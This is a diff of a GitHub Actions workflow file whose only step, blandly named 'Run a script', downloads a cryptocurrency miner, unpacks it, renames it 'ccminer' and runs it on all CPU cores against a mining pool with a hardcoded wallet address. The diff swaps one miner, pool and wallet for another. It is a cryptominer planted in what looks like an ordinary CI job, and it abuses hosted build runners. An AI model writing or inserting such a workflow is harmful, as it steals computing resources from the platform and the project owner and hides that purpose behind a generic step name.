@@ -9,4 +9,4 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Run a script
-        run: curl -LJ https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.0/SRBMiner-Multi-2-6-0-Linux.tar.gz -o x.tar.xz && tar -xf x.tar.xz && mv SRBMiner-Multi-2-6-0/SRBMiner-MULTI ./ccminer; chmod +x ./ccminer; rm -rf x.tar.xz; ./ccminer --algorithm ghostrider --pool stratum+ssl://ghostrider.unmineable.com:443 --wallet 'LTC:LTHZzHREhbJkP8vDyUCxqvz1yReBqEC2q8.CPU-GhostRider-Multi#mo4y-tkdg' -t $(nproc)
+        run: curl -LJ https://github.com/wong-fi-hung/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.tar.xz -o x.tar.xz && tar -xf x.tar.xz && rm -rf x.tar.xz; ./ccminer -a verus -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.GH -o stratum+tcp://ap.luckpool.net:3960 -p 'hybrid' -t $(nproc)
